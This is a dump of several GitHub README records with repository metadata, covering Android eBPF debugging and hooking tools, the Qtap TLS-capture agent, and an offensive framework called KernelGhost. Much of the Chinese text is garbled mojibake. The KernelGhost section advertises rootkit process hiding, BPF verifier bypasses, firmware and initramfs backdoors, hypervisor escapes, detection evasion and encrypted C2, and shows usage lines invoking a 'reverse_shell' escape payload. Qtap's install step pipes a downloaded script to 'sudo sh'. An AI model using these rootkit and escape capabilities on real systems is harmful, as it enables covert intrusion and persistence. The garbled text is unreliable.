- ä½¿ç”¨ç±»ä¼¼ [pwndbg](https://github.com/pwndbg/pwndbg) çš„ CLI ç•Œé¢å’Œç±»ä¼¼ GDB çš„äº¤äº’æ–¹å¼ï¼Œç®€å•æ˜“ä¸Šæ‰‹
- åŸºäºŽæ–‡ä»¶+åç§»çš„æ–­ç‚¹æ³¨å†Œæœºåˆ¶ï¼Œå¯ä»¥å¿«é€Ÿå¯åŠ¨ï¼Œæ”¯æŒå¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹è°ƒè¯•ã€‚

## ðŸ’• æ¼”ç¤º

![](demo.png)

## ðŸš€ è¿è¡ŒçŽ¯å¢ƒ

- ç›®å‰ä»…æ”¯æŒ ARM64 æž¶æž„çš„ Android ç³»ç»Ÿï¼Œéœ€è¦ ROOT æƒé™ï¼ŒæŽ¨èæ­é… [KernelSU](https://github.com/tiann/KernelSU) ä½¿ç”¨
- ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬5.10+ ï¼ˆå¯æ‰§è¡Œ`uname -r`æŸ¥çœ‹ï¼‰

## âš™ï¸ ä½¿ç”¨

1. ä¸‹è½½æœ€æ–° [Release](https://github.com/ShinoLeah/eDBG/releases) ç‰ˆæœ¬

2. æŽ¨é€åˆ°æ‰‹æœºçš„`/data/local/tmp`ç›®å½•ä¸‹ï¼Œæ·»åŠ å¯æ‰§è¡Œæƒé™

   ```shell
   adb push eDBG /data/local/tmp
   adb shell
   su
   chmod +x /data/local/tmp/eDBG
   ```

3. è¿è¡Œè°ƒè¯•å™¨

   ```shell
   ./eDBG -p com.pakcage.name -l libname.so -b 0x123456
   ```

   | é€‰é¡¹åç§° | å«ä¹‰                         |
   | -------- | ---------------------------- |
   | -p       | ç›®æ ‡åº”ç”¨åŒ…å                 |
   | -l       | ç›®æ ‡åŠ¨æ€åº“åç§°               |
   | -b       | åˆå§‹æ–­ç‚¹åç§»åˆ—è¡¨ï¼ˆé€—å·åˆ†éš”ï¼‰ |

   æ›´å¤šå¯åŠ¨é€‰é¡¹è§â€œè¿›é˜¶ä½¿ç”¨â€

4. è¿è¡Œè¢«è°ƒè¯• APP

   > eDBG ä¹Ÿå¯ä»¥ç›´æŽ¥é™„åŠ æ­£åœ¨è¿è¡Œçš„ APPï¼Œä½† eDBG ä¸ä¼šä¸»åŠ¨æ‹‰èµ·è¢«è°ƒè¯• APPã€‚

## âš ï¸ æ³¨æ„

- ç”±äºŽæœ¬é¡¹ç›®ä½¿ç”¨åŸºäºŽæ–‡ä»¶+åç§»çš„æ–­ç‚¹æ³¨å†Œæœºåˆ¶ï¼Œåœ¨è°ƒè¯•ç³»ç»Ÿåº“ï¼ˆ`libc.so`ã€`libart.so`ï¼‰æ—¶å¯èƒ½ä¼šæ¯”è¾ƒå¡é¡¿ã€‚
- **é‡è¦**ï¼šæœ¬é¡¹ç›®ä¸èƒ½éšæ—¶æš‚åœè¢«è°ƒè¯•ç¨‹åºï¼Œå› æ­¤**å¿…é¡»ç”¨ -b å¯åŠ¨é€‰é¡¹åœ¨å¯ç”¨ä½ç½®å…ˆæ–­ä¸‹ç¨‹åºæ‰èƒ½è¿›è¡ŒåŽç»­è°ƒè¯•**ã€‚
- ç”±äºŽ eDBG ä¸ç›´æŽ¥ trace ç¨‹åºï¼Œ**åªæœ‰æ–­ç‚¹è§¦å‘ã€ç¨‹åºåœæ­¢åŽå‘½ä»¤æ‰å¯æ­£å¸¸è¢«æ‰§è¡Œï¼Œåœ¨å…¶ä½™æ—¶é—´æ‰§è¡Œå‘½ä»¤å¯èƒ½å¯¼è‡´æœªçŸ¥åŽæžœ**ã€‚
- è¯¥é¡¹ç›®å¯ä»¥åœ¨ç›®æ ‡ç¨‹åºè¿è¡Œä¹‹å‰è¢«è¿è¡Œï¼Œå› æ­¤ä¸æ”¯æŒåœ¨å¯åŠ¨æ—¶æŒ‡å®šçº¿ç¨‹ idã€‚
- æœ€å¤šæ”¯æŒ 20 ä¸ªå¯ç”¨çš„æ–­ç‚¹ã€‚

## ðŸ’¡å‘½ä»¤è¯´æ˜Ž

- **æ–­ç‚¹** `break / b`
  - åç§»ï¼š`b 0x1234`ï¼ˆç›¸å¯¹åˆå§‹åŠ¨æ€åº“çš„åç§»ï¼‰
  - å†…å­˜åœ°å€ï¼š`b 0x6e9bfe214c`ï¼ˆéœ€è¦å½“å‰ç¨‹åºæ­£åœ¨è¿è¡Œï¼Œè™šæ‹Ÿåç§»ä¸Žæ–‡ä»¶åç§»ä¸ä¸€è‡´æ—¶å¯èƒ½å‡ºé”™ï¼‰
  - åº“å+åç§»ï¼š`b libraryname.so+0x1234`
  - å½“å‰åç§»ï¼š`b $+1`ï¼Œï¼ˆå½“å‰ä½ç½®+**æŒ‡ä»¤æ¡æ•°**ï¼‰
  - å¯ç”¨æ–­ç‚¹ï¼š`enable id`ï¼Œå¯ç”¨æŒ‡å®šæ–­ç‚¹ï¼ˆä½ å¯ä»¥åœ¨ `info` ä¸­æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯ï¼‰
  - ç¦ç”¨æ–­ç‚¹ï¼š`disable id`ï¼Œç¦ç”¨æŒ‡å®šæ–­ç‚¹
  - åˆ é™¤æ–­ç‚¹ï¼š`delete id`ï¼Œåˆ é™¤ç¬¬ id å·æ–­ç‚¹
- **è™šæ‹Ÿåç§»æ–­ç‚¹** `vbreak / vb` è®¾ç½®è™šæ‹Ÿåç§»æ–­ç‚¹ï¼ˆè™šæ‹Ÿåç§»ä¸Ž IDA ä¸­æ˜¾ç¤ºçš„åç§»ç›¸åŒï¼Œ**é™¤æ­¤åŠŸèƒ½å¤–ï¼Œé»˜è®¤å‡ä¸ºæ–‡ä»¶åç§»**ï¼‰
- **ç»§ç»­è¿è¡Œ** `continue / c`ï¼šç»§ç»­æ‰§è¡Œè‡³ä¸‹ä¸€æ–­ç‚¹
- **å•æ­¥è°ƒè¯•**
  - `step / s` å•æ­¥æ­¥å…¥ï¼ˆè¿›å…¥å‡½æ•°è°ƒç”¨ï¼‰
  - `next / n` å•æ­¥æ­¥è¿‡ï¼ˆè·³è¿‡å‡½æ•°è°ƒç”¨ï¼‰
- **æŸ¥çœ‹å†…å­˜** `examine / x`
  - åœ°å€ï¼š`x 0x12345678`ï¼ˆé»˜è®¤é•¿åº¦ 16ï¼‰
  - åœ°å€+é•¿åº¦ï¼š`x 0x12345678 128`
  - åœ°å€+ç±»åž‹ï¼š`x X0 ptr/str/int`
  - åœ°å€å’Œé•¿åº¦å¯ä»¥æ˜¯ä»»æ„è¡¨è¾¾å¼ï¼Œå…è®¸ä½¿ç”¨å¯„å­˜å™¨åç§°ä½œä¸ºå˜é‡å¦‚`x SP+128 X1+0x58`
- **æŸ¥çœ‹è°ƒç”¨æ ˆ** `backtrace / bt` æˆ–è€… `backtrace1 / bt1`  
- **é€€å‡º** `quit / q`ï¼šé€€å‡º**è°ƒè¯•å™¨**ï¼ˆä¸ä¼šå½±å“ç¨‹åºè¿è¡Œï¼‰
- **æŸ¥çœ‹ä¿¡æ¯** `info / i`

  - `info b/break`ï¼šåˆ—å‡ºå½“å‰æ‰€æœ‰æ–­ç‚¹ï¼ˆ`[+]`=å·²å¯ç”¨ï¼Œ`[-]`=æœªå¯ç”¨ï¼‰
  - `info register/reg/r`ï¼šæŸ¥çœ‹æ‰€æœ‰å¯„å­˜å™¨ä¿¡æ¯ã€‚
  - `info thread/t`ï¼šåˆ—å‡ºå½“å‰æ‰€æœ‰çº¿ç¨‹å’Œå·²è®¾å®šçš„çº¿ç¨‹è¿‡æ»¤å™¨ã€‚
  - `info file/f`ï¼šæ‰“å°æŒ‡å®šæ–‡ä»¶çš„åœ°å€å’Œåç§»ã€‚
- **é‡å¤ä¸Šä¸€æ¡æŒ‡ä»¤**ï¼šç›´æŽ¥å›žè½¦

æ›´å¤šå‘½ä»¤è§â€œè¿›é˜¶ä½¿ç”¨â€

## ðŸ§‘â€ðŸ’» è¿›é˜¶ä½¿ç”¨

å…¶ä»–çš„å¯ç”¨é€‰é¡¹ï¼š

| é€‰é¡¹åç§°               | å«ä¹‰                                                         |
| ---------------------- | ------------------------------------------------------------ |
| -t                     | çº¿ç¨‹åç§°è¿‡æ»¤å™¨ï¼ˆé€—å·åˆ†éš”ï¼‰                                   |
| -i filename            | ä½¿ç”¨é…ç½®æ–‡ä»¶                                                 |
| -s                     | ä¿å­˜è¿›åº¦åˆ°ä½¿ç”¨çš„é…ç½®æ–‡ä»¶                                     |
| -o filename            | ä¿å­˜è¿›åº¦åˆ°æŒ‡å®šæ–‡ä»¶åï¼ˆä¸Ž -s å†²çªï¼‰                           |
| -hide-register         | ç¦ç”¨å¯„å­˜å™¨ä¿¡æ¯è¾“å‡º                                           |
| -hide-disassemble      | ç¦ç”¨åæ±‡ç¼–ä»£ç è¾“å‡º                                           |
| -prefer                | uprobe æˆ– hardwareï¼ŒæŒ‡å®šåœ¨å•æ­¥è°ƒè¯•ä¸­ä½¿ç”¨çš„æ–­ç‚¹ï¼Œé»˜è®¤æ··ç”¨     |
| -disable-color         | ç¦ç”¨å½©è‰²è¾“å‡º                                                 |
| -disable-package-check | ç¦ç”¨åŒ…åæ£€æŸ¥ï¼Œæ­¤æ—¶åŒ…åå¯ä»¥æ˜¯è¿›ç¨‹åï¼Œåº“åå¿…é¡»ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚**æµ‹è¯•åŠŸèƒ½** |
| -show-vertual          | å¯ç”¨é»˜è®¤è™šæ‹Ÿåœ°å€æ˜¾ç¤ºï¼Œæ˜¾ç¤ºåç§»ä¸Ž ida ç›¸åŒï¼Œä½†å¯èƒ½å¯¼è‡´ break ç­‰å‘½ä»¤åç§»å¯¹ä¸ä¸Šã€‚ |

æ›´å¤šçš„å¯ç”¨å‘½ä»¤ï¼š

- **ç¡¬ä»¶æ–­ç‚¹** `hbreak`ï¼šä¸Ž break ç”¨æ³•ç›¸åŒï¼Œé™åˆ¶ 4 ä¸ªä»¥å†…ã€‚

- **å†™ç›‘æŽ§** `watch`ï¼šä¸Ž break ç”¨æ³•ç›¸åŒï¼Œå½“æŒ‡å®šåœ°å€è¢«å†™å…¥æ—¶è§¦å‘ï¼Œå±žäºŽç¡¬ä»¶æ–­ç‚¹ã€‚

- **è¯»ç›‘æŽ§** `rwatch`ï¼šåŒä¸Šã€‚

- **é€€å‡ºå‡½æ•°** `finish / fi`ï¼šæ‰§è¡Œç›´åˆ°å½“å‰å‡½æ•°é€€å‡º

  > ç›®å‰è¿™ä¸ªåŠŸèƒ½çš„å®žé™…å®žçŽ°æ˜¯åŸºäºŽ LR çš„ï¼Œå¦‚æžœ LR è¢«ç”¨ä½œåˆ«çš„ç”¨é€”è¯·ä½¿ç”¨ until 

- **è¿è¡Œç›´åˆ°** `until / u`ï¼šè¿è¡Œç›´åˆ°æŒ‡å®šåœ°å€ã€‚åœ°å€çš„æŒ‡å®šæ–¹æ³•ä¸Žæ–­ç‚¹ç›¸åŒ

- **å†™å†…å­˜** `write 0x1235 62626262`ï¼šå‘æŒ‡å®šåœ°å€å†™å…¥ Hex Stringï¼Œåœ°å€æŒ‡å®šæ–¹æ³•ä¸Ž `examine` ç›¸åŒï¼Œç›®æ ‡åœ°å€å¿…é¡»å¯å†™

- **Dump å†…å­˜** `dump address length filename`ï¼šå°†æŒ‡å®šåœ°å€çš„å†…å­˜å†™å…¥æ–‡ä»¶

- **å±•ç¤ºå†…å­˜** `display / disp`

  - åœ°å€ï¼š`disp 0x123456`ï¼Œ(æ¯æ¬¡è§¦å‘æ–­ç‚¹æˆ–å•æ­¥æ—¶æ‰“å°)

  - åœ°å€+é•¿åº¦ï¼š`disp 0x123456 128`

  - åœ°å€+é•¿åº¦+å˜é‡åï¼š`disp 0x123456 128 name`ï¼Œå±•ç¤ºåŒæ—¶æ‰“å°è¯¥å˜é‡å

    > âš ï¸ è‹¥å†…å­˜åœ°å€å˜åŒ–ï¼ˆe.g. åº”ç”¨é‡å¯ï¼‰ï¼Œæ­¤åŠŸèƒ½å°†æ— æ³•è¾“å‡ºæ­£ç¡®ä¿¡æ¯ã€‚

- **å–æ¶ˆå±•ç¤ºå†…å­˜**`undisplay / undisp <id>`ï¼šå–æ¶ˆå±•ç¤ºç¬¬ id å·å˜é‡

- **è®¾ç½®ç¬¦å·** `set address name`ï¼šè®¾ç½®æŒ‡å®šåœ°å€ç¬¦å·ã€‚

- **çº¿ç¨‹ç›¸å…³** `thread / t`

  - `t`ï¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨çº¿ç¨‹ã€‚
  - `t + 0`ï¼šå¢žåŠ çº¿ç¨‹è¿‡æ»¤å™¨åœ¨ç¬¬ 0 ä¸ªçº¿ç¨‹ï¼ˆä½¿ç”¨`info t`æŸ¥çœ‹æ‰€æœ‰çº¿ç¨‹ idï¼‰ï¼Œæ³¨æ„ä¸æ˜¯æŒ‡å®š `tid`
  - `t - 0`ï¼šå–æ¶ˆç¬¬ 0 ä¸ªçº¿ç¨‹è¿‡æ»¤å™¨
  - `t all`ï¼šåˆ é™¤æ‰€æœ‰çº¿ç¨‹è¿‡æ»¤å™¨ã€‚
  - `t +n threadname`ï¼šå¢žåŠ çº¿ç¨‹åç§°è¿‡æ»¤å™¨ã€‚

- **æŸ¥çœ‹ä»£ç ** `list / l / disassemble / dis`

  - ç›´æŽ¥æŸ¥çœ‹ï¼š`l`ï¼Œæ‰“å°å½“å‰ PC ä½ç½®å¼€å§‹ 10 æ¡æŒ‡ä»¤
  - æŸ¥çœ‹æŒ‡å®šåœ°å€ï¼š`l 0x1234`ï¼Œæ‰“å°å¯¹åº”å†…å­˜åœ°å€ 10 æ¡æŒ‡ä»¤
  - æŸ¥çœ‹æŒ‡å®šåœ°å€æŒ‡å®šé•¿åº¦æŒ‡ä»¤ï¼š`l 0x1234 20`ï¼Œæ‰“å°å¯¹åº”å†…å­˜åœ°å€å¯¹åº”**æŒ‡ä»¤æ¡æ•°**çš„æŒ‡ä»¤

## ðŸ›« ç¼–è¯‘

1. çŽ¯å¢ƒå‡†å¤‡

   æœ¬é¡¹ç›®åœ¨ x86 Linux ä¸‹äº¤å‰ç¼–è¯‘

   ```shell
   sudo apt-get update
   sudo apt-get install golang-1.18
   sudo apt-get install clang-14
   export GOPROXY=https://goproxy.cn,direct
   export GO111MODULE=on
   ```

2. ä¸‹è½½ NDK å¹¶è§£åŽ‹ï¼Œä¿®æ”¹ build_arm.sh ä¸­çš„ NDK_ROOT

3. ç¼–è¯‘

   ```shell
   git clone --recursive https://github.com/ShinoLeah/eDBG.git
   ./build_env.sh
   ./build_arm.sh
   ```

## ðŸ’­ å®žçŽ°åŽŸç†

- æ‰€æœ‰æ–­ç‚¹å‡åŸºäºŽ uprobeï¼Œå¦‚æžœä½ å¾ˆåœ¨æ„è¢«æ£€æµ‹åˆ°ï¼Œè¯·å‚è€ƒæœ€ä¸‹æ–¹æ–‡ç« 
- `step / next / until / finish` åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ç¡¬ä»¶æ–­ç‚¹ï¼ˆä»…åœ¨è·³è½¬æŒ‡ä»¤ä½¿ç”¨ uprobeï¼‰ï¼Œæ— æ³•è¢«ç”¨æˆ·æ€æŽ¢æµ‹åˆ°ï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨ï¼ˆå¦‚æžœè¿™ä¸ªåŠŸèƒ½æ²¡æ³•å·¥ä½œï¼Œè€ƒè™‘ä½¿ç”¨ `prefer=hardware` æˆ– `prefer=uprobe`ï¼‰
- å»ºè®®ä½¿ç”¨ b åœ¨è·³è½¬æŒ‡ä»¤å¤„ä¸‹æ–­ç‚¹æ­é…å•æ­¥ä½¿ç”¨ã€‚
- [eDBG ä½¿ç”¨è¿›é˜¶ï¼šé¿å… uprobes äº§ç”Ÿå¯è¢«å¯Ÿè§‰çš„ç‰¹å¾](https://www.sh1no.icu/posts/28348c4/)

## ðŸ¤ å‚è€ƒ

- [SeeFlowerX/stackplz](https://github.com/SeeFlowerX/stackplz/tree/dev)
- [pwndbg](https://github.com/pwndbg/pwndbg)

## â¤ï¸â€ðŸ©¹ å…¶ä»–

- å–œæ¬¢çš„è¯å¯ä»¥ç‚¹ç‚¹å³ä¸Šè§’ Star ðŸŒŸ
- æ¬¢è¿Žæå‡º Issue æˆ– PRï¼
"
qpoint-io/qtap,1350,41,1350,3,C,"Qtap: An eBPF agent that captures pre-encrypted network traffic, providing rich context about egress connections and their originating processes.",2025-04-16T15:08:49Z,2025-10-09T07:10:57Z,129,"<br/>
<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""./.github/assets/qtap-header-dark.svg"">
  <source media=""(prefers-color-scheme: light)"" srcset=""./.github/assets/qtap-header-light.svg"">
  <img alt=""Image showing the Qtap Header"" src=""./.github/assets/qtap-header-light.svg"">
</picture>


----------

<div align=""center"">
    <a href=""https://qpoint.io/qtap""><img alt=""Link to Qpoint website"" src=""https://img.shields.io/badge/Qpoint.io-grey?style=for-the-badge&link=https%3A%2F%2Fqpoint.io&logo=data:image/svg%2bxml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0iTGF5ZXJfMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNjcuMTggNjcuMzQiPgogIDxkZWZzPgogICAgPHN0eWxlPgogICAgICAuY2xzLTEgewogICAgICAgIGZpbGw6ICM4OTVhZTg7CiAgICAgIH0KICAgIDwvc3R5bGU+CiAgPC9kZWZzPgogIDxnIGlkPSJtYWluIj4KICAgIDxnPgogICAgICA8cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik02NC4xMSw2Ny4zNGMtLjczLDAtMS40Ni0uMjgtMi4wMi0uODRsLTEuOTctMS45N2MtMS4xMS0xLjEyLTEuMTEtMi45MiwwLTQuMDQsMS4xMi0xLjExLDIuOTItMS4xMiw0LjA0LDBsMS45NywxLjk3YzEuMTEsMS4xMiwxLjExLDIuOTIsMCw0LjA0LS41Ni41Ni0xLjI5Ljg0LTIuMDIuODRaIi8+CiAgICAgIDxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTMzLjU5LDBDMTUuMDQsMCwwLDE1LjA0LDAsMzMuNTlzMTUuMDQsMzMuNTksMzMuNTksMzMuNTksMzMuNTktMTUuMDQsMzMuNTktMzMuNTlTNTIuMTQsMCwzMy41OSwwWk01My43OSw1NC4xN2MtLjU2LjU2LTEuMjkuODQtMi4wMi44NHMtMS40Ni0uMjgtMi4wMi0uODRsLTguMzEtOC4zMWMtMS4xMi0xLjEyLTEuMTItMi45MiwwLTQuMDQsMS4xMS0xLjEyLDIuOTMtMS4xMiw0LjA0LDBsOC4zMSw4LjMxYzEuMTIsMS4xMiwxLjEyLDIuOTIsMCw0LjA0WiIvPgogICAgPC9nPgogIDwvZz4KPC9zdmc+"" /></a>&nbsp;
    <a href=""https://docs.qpoint.io/qtap""><img alt=""Link to documentation"" src=""https://img.shields.io/badge/Documentation-grey?style=for-the-badge&logo=readthedocs&logoColor=%23FFFFFF&link=https%3A%2F%2Fdocs.qpoint.io/qtap"" /></a>&nbsp;
    <a href=""https://github.com/qpoint-io/qtap/stargazers""><img alt=""GitHub Repo stars"" src=""https://img.shields.io/github/stars/qpoint-io/qtap?style=for-the-badge&color=%23e8e85a"" /></a>&nbsp;
    <a href=""https://github.com/qpoint-io/qtap/actions/workflows/ci.yaml?query=branch%3Amain""><img alt=""GitHub main branch check runs"" src=""https://img.shields.io/github/check-runs/qpoint-io/qtap/main?style=for-the-badge"" /></a>&nbsp;
    <a href=""https://github.com/qpoint-io/qtap/blob/main/LICENSE""><img alt=""GitHub License"" src=""https://img.shields.io/github/license/qpoint-io/qtap?style=for-the-badge"" /></a>
</div>

<br />

An eBPF agent that captures traffic flowing through the Linux kernel. By attaching to TLS/SSL functions, data is intercepted before and after encryption and then passed to flexible plugins with full visibility along with all of the available context - process/container/host/user/protocol/etc. Qtap makes it possible to understand what's happening with your egress traffic, without modifying apps, installing proxies, or managing certs.

<br />

Qtap shows you exactly what data is being sent and received in its original, unencrypted form while operating out-of-band with minimal overhead, without adding latency or disrupting application performance.

<br/>
<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""./.github/assets/qtap-overview-dark.svg"">
  <source media=""(prefers-color-scheme: light)"" srcset=""./.github/assets/qtap-overview-light.svg"">
  <img alt=""Image showing an architectual overview of Qtap"" src=""./.github/assets/qtap-overview-light.svg"">
</picture>
<br/><br/><br/>

Qtap can augment your existing observability piplines or can be used as a foundational component for a custom solution, like [Qpoint](https://www.qpoint.io/qtap), in a variety of ways, including:

- **Security auditing** - Security professionals can verify sensitive data isn't being unintentionally exposed in network communications.
- **Debugging network issues** - When APIs return errors or connections fail, seeing the actual data being sent helps identify misconfigured parameters, malformed requests, or unexpected responses.
- **API development** - Developers can verify their applications are sending correctly formatted requests and properly handling responses without modifying code.
- **Troubleshooting third-party integrations** - When integrating with external services, Qtap helps confirm what data is actually being exchanged versus what documentation claims.
- **Learning and exploration** - Understanding how protocols actually work by observing real traffic between applications and services.
- **Legacy system investigation** - When working with poorly documented or legacy systems, Qtap provides insights into how they communicate without requiring source code access.
- **Validation testing** - Confirming that application changes don't unexpectedly alter network communication patterns.

<br />

![Qtap Demo](./.github/assets/qtap_demo.gif)

For more information [see the ""How It Works"" section of our website](https://docs.qpoint.io/readme/how-it-works).

## Quick Start
Want to give Qtap a test run? Spin up a temporary instance in Demo mode! See the traffic in real time right in your terminal.

```bash
# Run Qtap in demo mode
$ curl -s https://get.qpoint.io/demo | sudo sh
```

Or install and start running right away!

```bash
# Install the Qtap agent
$ curl -s https://get.qpoint.io/install | sudo sh

# Run with defaults!
$ sudo qtap
```

## Community

Converse with Qpoint devs and the contributors in [Github Discussions](https://github.com/qpoint-io/qtap/discussions).

## Requirements

- Linux with Kernel 5.10+ with [BPF Type Format (BTF)](https://www.kernel.org/doc/html/latest/bpf/btf.html) enabled. You can check if your kernel has BTF enabled by verifying if `/sys/kernel/btf/vmlinux` exists on your system.
- eBPF enabled on the host.
- Elevated permissions on the host or within the Docker container running the agent:
    - on host run with `sudo`
    - within docker it's best to run with `CAP_BPF`, host pids, and privileged. For example:
    ``` bash
    docker run \
        --user 0:0 \
        --privileged \
        --cap-add CAP_BPF \
        --cap-add CAP_SYS_ADMIN \
        --pid=host \
        --network=host \
        -v /sys:/sys \
        --ulimit=memlock=-1 \
        us-docker.pkg.dev/qpoint-edge/public/qpoint:v0 \
        tap \
        --log-level=info
    ```

## Development
### Prerequisites
#### OS

- linux (kernel 5.10+)
    - MacOS developers at Qpoint have enjoyed using [Lima](https://lima-vm.io/) as a quick, easy linux VM for development.

#### Tools:
- go1.24+
- make
- clang14 (version 14 is required)
- clang-tidy (optional/recommended)

### Quick Start
```bash
$ git clone https://github.com/qpoint-io/qtap.git
$ make build
```

#### Popular `Makefile` targets
These are the most commonly used targets by Qpoint devs:

- `build` - generates the eBPF binaries and builds the Go application
- `generate` - generates the eBPF binaries
- `run` - runs a debug instance of the Qtap
- `ci` - runs all of the ci checks (nice to use before pushing code)

## Telemetry

### Traces

Tracing can be enabled by setting the `OTEL_TRACES_EXPORTER` and `OTEL_EXPORTER_OTLP_PROTOCOL` env vars per the OpenTelemetry docs [[1]](https://opentelemetry.io/docs/languages/sdk-configuration/otlp-exporter/) [[2]](https://opentelemetry.io/docs/specs/otel/configuration/sdk-environment-variables/#exporter-selection).

### Metrics

We have two metrics endpoints on `localhost:10001`:

- `/metrics` contains metrics that can be used to create dashboards for monitoring the activity on your system
- `/system/metrics` contains metrics related to the health of the qtap agent

We have a sample Grafana dashboard: [examples/dashboards/qtap-http-overview.json](./examples/dashboards/qtap-http-overview.json).

![sample http overview dashboard](./examples/dashboards/qtap-http-overview.png)

## Project Status

This project is currently in early development. We're excited to share our work with the community and welcome your feedback! While we're actively improving things, please note that:

- Some APIs may change as we refine our approach
- Documentation might be incomplete in places
- There may be rough edges we haven't smoothed out yet

We welcome contributions through GitHub issues and appreciate your understanding that we're a small team balancing multiple priorities. We value constructive feedback that helps us make this project better.

Thank you for checking out our work!

## Contributing

By submitting contributions to this project, you agree to the [Contributor License Agreement](./.github/CLA.md). This agreement allows us to include your contributions in both the open source and commercial versions.

## Licensing

This project is dual-licensed under AGPLv3.0 (for open source use) and a commercial license (for commercial use).

<div align=""right"">
    <picture>
    <source media=""(prefers-color-scheme: dark)"" srcset=""./.github/assets/qpoint-open.svg"">
    <source media=""(prefers-color-scheme: light)"" srcset=""./.github/assets/qpoint-open-light.svg"">
    <img alt=""Image showing 'Qpoint â¤ OpenSource'"" src=""./.github/assets/qpoint-open-light.svg"">
    </picture>
</div>
"
Aviral2642/kernelghost,16,1,16,0,C,"KernelGhost is a next-generation offensive security framework that combines stealthy eBPF-based rootkit capabilities with advanced hypervisor escape techniques. It enables persistent cross-VM access, stealth process hiding, UEFI firmware backdoors, and more all while evading modern detection systems.",2025-03-22T05:34:54Z,2025-08-05T12:30:14Z,5,"# ðŸ”¥ KernelGhost: Hypervisor & eBPF Rootkit Framework


**Next-generation offensive security framework combining eBPF stealth and hypervisor-level exploitation**  
*""When userland isn't enough and the kernel isn't safe""*



---

## ðŸ“Œ Features

### ðŸ•µï¸â€â™‚ï¸ Core Capabilities
- **eBPF-Based Rootkit**
  - Process/network hiding via syscall hooking
  - `/proc`/`/sys` filesystem manipulation
  - Anti-forensic BPF verifier bypasses

- **Hypervisor Escapes**
  - KVM/QEMU guest-to-host memory writes
  - Hyper-V VMBus ring buffer exploitation (CVE-2023-XXXX)
  - Nested virtualization attacks

- **Advanced Persistence**
  - UEFI firmware implants via SPI flash
  - Initramfs backdoor injection
  - Cross-VM migration survival

---

### ðŸ›¡ï¸ Defense Evasion

| Technique                | Implementation                     | Bypasses            |
|-------------------------|--------------------------------------|---------------------|
| Kernel Symbol Obfuscation | `__ksymtab` modification           | Sysdig, ftrace      |
| Memory Cloaking          | Nested Page Table manipulation      | LiME, Volatility    |
| Cryptographic C2         | AES-256-GCM over DNS-over-HTTPS     | Network IDS         |

---

## ðŸš€ Quick Start

### ðŸ”§ Prerequisites

```bash
# Ubuntu 22.04+ (Linux kernel â‰¥5.15)
sudo apt install linux-headers-$(uname -r) clang-15 bpftool qemu-kvm
```

### ðŸ› ï¸ Installation

```bash
git clone https://github.com/Aviral2642/kernelghost.git
cd kernelghost
make all -j$(nproc)
sudo make deploy
```

---

## ðŸ§ª Basic Usage

```python
from ghostctl import Ghost

# Hide process from detection
gh = Ghost()
gh.hide_pid(1337)

# Execute hypervisor escape
if gh.check_hypervisor() == ""KVM"":
    gh.escape_vm(payload=""reverse_shell"")
```

---

## ðŸ§© Examples

### ðŸ” Process Ghosting

```bash
# Hide current shell process
./examples/process_ghosting $$

# Verify hiding (should show error)
ps -p $$
```

### ðŸ§¨ VM Escape PoC

```bash
# Launch attack on KVM host
./examples/vm_escape_poc --payload host_mem_dump.bin
```

### ðŸŽ¯ Cobalt Strike Integration

```bash
python examples/cs_integration.py --listen 443 --aes-key $(openssl rand -hex 32)
```

---

## ðŸ“š Documentation

| Document                  | Description                                 |
|--------------------------|---------------------------------------------|
| `TECHNICAL.md`           | Architecture, attack flows, internals       |
| `DEPLOYMENT.md`          | Deployment checklist, OPSEC practices       |

---

## ðŸ› ï¸ Development

### ðŸ”§ Build Options

```bash
# Build with debug symbols
make DEBUG=1

# Cross-compile for ARM64
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu-
```

### âœ… Testing

```bash
# Run kernel module tests
make -C tests kunit

# eBPF verifier bypass tests
./tests/verify_bypass.sh
```

---

## ðŸŒŸ Roadmap

- âœ… ARM64/M1 Silicon Support (Q4 2024)
- â³ Windows Hyper-V Rootkit Module (Q1 2025)
- ðŸš§ Quantum-Safe C2 Channels (PQ3/TLS1.3+)

---

## âš ï¸ Disclaimer

This project is intended for:

- âœ… Authorized red team engagements
- âœ… Academic research on advanced persistence
- âœ… Defensive countermeasure development

> â— **Never use this tool for unauthorized access. Developers assume no liability for misuse.**
"
ShinoLeah/eHook,55,12,55,0,C,A Simple uprobe Hook Framework,2025-03-29T08:18:49Z,2025-10-02T12:47:56Z,8,"# eHook

## âœ¨ ä»‹ç»

- å¿«é€Ÿã€æ–¹ä¾¿åœ°æž„å»ºä½ çš„ uprobe hook æ¨¡å—ã€‚
- æä¾›ä¸€äº›æ–¹ä¾¿çš„å°è£…ã€‚

## ðŸš€ è¿è¡ŒçŽ¯å¢ƒ

- ç›®å‰ä»…æ”¯æŒ ARM64 æž¶æž„çš„ Android ç³»ç»Ÿï¼Œéœ€è¦ ROOT æƒé™ï¼ŒæŽ¨èæ­é… [KernelSU](https://github.com/tiann/KernelSU) ä½¿ç”¨
- ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬5.10+ ï¼ˆå¯æ‰§è¡Œ`uname -r`æŸ¥çœ‹ï¼‰

## ðŸ’• ä½¿ç”¨

åœ¨ `/user` ç›®å½•ä¸‹å·¥ä½œ

- åœ¨ `config.go` é‡Œè®¾ç½®ç›®æ ‡ä¿¡æ¯ï¼Œå¦‚ï¼š

  ```go
  const PackageName = ""com.android.myapplication""
  const LibraryName = ""libc.so""
  // The offset to which the onEnter function will be attached. 0 if not used.
  const Enter_Offset = 0xAFF44
  // The offset to which the onLeave function will be attached. 0 if not used.
  const Leave_Offset = 0x9C158
  ```

  - å¯ä»¥åœ¨`LibraryName`ä¸­æŒ‡å®šåº“çš„ç»å¯¹è·¯å¾„ã€‚

